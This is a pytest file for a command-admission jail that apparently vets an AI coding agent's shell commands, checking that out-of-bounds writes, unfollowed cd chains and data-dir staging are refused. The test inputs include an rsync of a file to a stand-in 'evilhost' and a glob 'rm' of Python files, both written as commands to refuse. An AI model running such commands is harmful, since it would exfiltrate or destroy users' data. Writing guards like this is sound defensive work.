# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 228 S3b: the coder's four Bash checks read parse then admit_role; hunt rows on that path.
from __future__ import annotations

import ast
from pathlib import Path

import pytest
from lib import jail, shell
from lib.admit import Admitted, admit_role, role_for
from lib.shparse import parse

from tests.conftest import CFG, CWD, SCRIPTS_DIR, WT
from tests.hook_chain import decide, evaluate
from tests.jail_cases import _unit_repo
from tests.payloads import _b, _cwd

pytestmark = pytest.mark.usefixtures("jail_fakes")
# 228 S3b: a refused command's text is never read again; none of these runs on the coder path.
RETIRED_READERS = frozenset(
    {"worker_parse", "worker_segments", "tokenize", "_raw_words", "_regex_tripwire"}
    | {"_exempt_indices", "chain_bases", "install_form", "install_reason", "download_reason"}
    | {"search_opaque", "_write_operands", "_coder_write_targets", "_segment_units"}
    | {"_cd_relative_target", "strip_wrappers", "confine_split", "_segment_reason", "quote_walk"}
)
CODER_PATH = {
    "checks/confine.py": ("judge", "_is_test", "_terraform_reason", "_declared_tests"),
    "checks/unit_writes.py": ("_bash_reason", "_followed", "_relative", "_targets", "_units"),
    "checks/network_tools.py": ("_coder_reason",),
    "checks/shell_tripwires.py": ("_coder_reason", "_coder_hygiene"),
    "lib/jail.py": ("coder_call", "coder_refusal", "coder_constant", "lead_cd", "coder_base"),
}


def _names(path: Path, functions: tuple[str, ...]) -> set[str]:
    tree = ast.parse(path.read_text(encoding="utf-8"))
    found: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.FunctionDef) and node.name in functions:
            for inner in ast.walk(node):
                if isinstance(inner, ast.Name):
                    found.add(inner.id)
                elif isinstance(inner, ast.Attribute):
                    found.add(inner.attr)
    return found


@pytest.mark.parametrize("module", sorted(CODER_PATH))
def test_the_coder_path_reads_no_retired_reader(module: str) -> None:
    # 228 S3b, SA-4: the checks read the parse and the Admitted record, never the command text.
    hits = _names(SCRIPTS_DIR / module, CODER_PATH[module]) & RETIRED_READERS
    assert hits == set(), (module, hits)


def test_a_relative_git_folder_after_the_leading_cd_runs_from_its_folder() -> None:
    # 228 S3b: git -C joins the folder the leading cd moved to, as bash runs it.
    command = "cd /a && git -C b status"
    got = admit_role(parse(command), role_for("coder"), "/c", text=command)
    assert isinstance(got, Admitted)
    git_dir = got.commands[1].git_dir
    assert git_dir is not None and git_dir.text == "/a/b"


def _in_repo(command: str, tmp_path: Path) -> tuple[jail.Decision, Path]:
    repo, wt = _unit_repo(tmp_path / "repo")
    hook_input = _cwd(_b("coder", command.format(wt=wt, repo=repo)), repo)
    return decide(hook_input, CFG), wt


@pytest.mark.parametrize(
    "command",
    [
        "cd {wt} && ls || tee a.txt",
        "cd {wt}\ntee a.txt",
        "cd {wt} && ls; tee a.txt",
        "cd {wt} && cd src && tee a.txt",
        "cd {repo}/.claude && git -C worktrees/u1 add a.txt",
    ],
)
def test_a_relative_write_after_a_cd_the_chain_does_not_follow_is_refused(
    command: str, tmp_path: Path
) -> None:
    # O6, SS-6, AC-5: a || or ; join, a newline, a second cd or a cd outside a unit.
    d, _ = _in_repo(command, tmp_path)
    assert not d.allow, (command, d.reason)


def test_the_followed_cd_admits_its_relative_write(tmp_path: Path) -> None:
    # AC-2: one token from the row above; && keeps the cd.
    d, _ = _in_repo("cd {wt} && ls && tee a.txt", tmp_path)
    assert d.allow, d.reason


@pytest.mark.parametrize(
    ("command", "constant"),
    [
        (f"sort -o {CWD}/src/a.py {WT}/b.txt", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"sort --output={CWD}/src/a.py {WT}/b.txt", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"uniq {WT}/a.txt {CWD}/src/a.py", jail.R_BASH_OUTSIDE.format(f"{CWD}/src/a.py")),
        (f"find {WT} -fprint {WT}/out.txt", shell.R_FIND_WRITE),
        (f"rsync {WT}/a.txt evilhost:x", shell.R_RSYNC_REMOTE),
        (f"cd {WT} && python3 ../x.py", shell.R_INLINE),
    ],
)
def test_a_typed_write_or_program_off_its_bounds_is_refused(command: str, constant: str) -> None:
    # 228 S3b, SA-6: a write named by an option or an operand slot is judged by its typed path.
    d = decide(_b("coder", command), CFG)
    assert not d.allow and d.reason == constant, (command, d.reason)


def test_a_data_dir_stage_the_grammar_admits_meets_the_tripwire() -> None:
    # 0010, 228 S3b: git add is on the coder grammar; the data dir is never committed.
    command = f"git -C {WT} add {WT}/.claude/daedalus/config.json"
    assert evaluate("shell_tripwires", _b("coder", command)) == shell.R_DATA_DIR_GIT


@pytest.mark.parametrize("command", [f"tee ~/x {WT}/a.txt", f"rm {WT}/*.py", f"tee {WT}/$X"])
def test_an_expanding_write_operand_is_refused_by_name(command: str) -> None:
    # SS-4: a glob, ~ or parameter in a write operand is unknown until the shell builds it.
    got = str(evaluate("unit_writes", _b("coder", command)))
    assert "Refused: " in got, (command, got)
